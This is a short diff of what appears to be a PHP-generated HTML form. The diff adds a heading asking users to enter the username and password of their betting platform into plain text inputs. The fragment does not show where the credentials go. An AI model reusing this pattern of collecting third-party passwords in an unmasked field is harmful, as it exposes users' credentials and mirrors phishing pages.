@@ -16,6 +16,7 @@ echo <<< END_OF_TEXT
 <input type="text" name="Email" placeholder="EMAIL" style="border-radius: 10px;"  >
 <input type="text" name="password" placeholder="PASSWORD" style="border-radius: 10px;"  >
 <input type="submit" value="LINK">
+<h2>SELECT AND ENTER THE USERNAME AND PASSWORD OF YOUR BETTING PLATFORM</h2>
 </form>
 <h2 id="result"></h2>
 <script>
